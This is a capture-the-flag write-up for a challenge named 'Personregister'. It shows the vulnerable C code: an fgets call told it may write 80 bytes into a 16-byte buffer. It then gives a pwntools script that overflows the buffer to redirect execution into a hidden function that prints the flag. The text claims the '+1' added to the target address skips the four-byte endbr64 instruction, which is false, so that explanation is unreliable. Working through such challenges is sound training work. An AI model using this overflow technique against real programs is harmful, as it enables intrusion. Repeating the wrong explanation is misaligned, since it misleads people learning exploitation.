# Personregister - Writeup

**Flag:** `S2G{2r776g76866tb883742c93738233d3333}`

## Vulnerability

The main menu itself is safe - commands are read with a bounded `fgets`.
The bug is hiding in the "admin menu" (`hemmeligMeny`, Norwegian for "secret
menu"), reached via the `H` command:

```c
void hemmeligMeny() {
    char adminCmd[16];
    puts("\n=== Admin-meny ===");
    printf("Skriv admin-kommando: ");
    fgets(adminCmd, STRLEN, stdin);   // STRLEN is 80, buffer is only 16!
    printf("Ugyldig admin-kommando: %s\n", adminCmd);
}
```

`adminCmd` is only 16 bytes, but `fgets` is told it can write up to
`STRLEN` (80) bytes into it - a classic buffer-size mismatch. That gives a
64-byte stack overflow, enough to reach and overwrite the saved return
address.

The program conveniently ships its own win condition:

```c
void skrivFlagg() {
    system("cat flag.txt");
    exit(0);
}
```

`skrivFlagg()` ("write flag") is never called anywhere - the goal is to
redirect execution into it via the overflow.

## Exploit

```python
from pwn import *

elf = context.binary = ELF("./chall")
io = remote("localhost", 1337)

io.sendline(b'H')
io.sendline(b'a' * 24 + p64(elf.sym.skrivFlagg + 1))
io.interactive()
```

- Send `H` to land in `hemmeligMeny()`.
- Send 24 bytes of padding to fill `adminCmd` and reach the saved return
  address on the stack, followed by the address of `skrivFlagg`.
- The `+1` skips the function's leading `endbr64` instruction, which is a
  common, harmless adjustment needed when jumping directly into a function
  on CET-enabled binaries rather than calling it normally.

When the function returns, execution jumps into `skrivFlagg()` instead of
back into `main()`, and the flag gets printed.
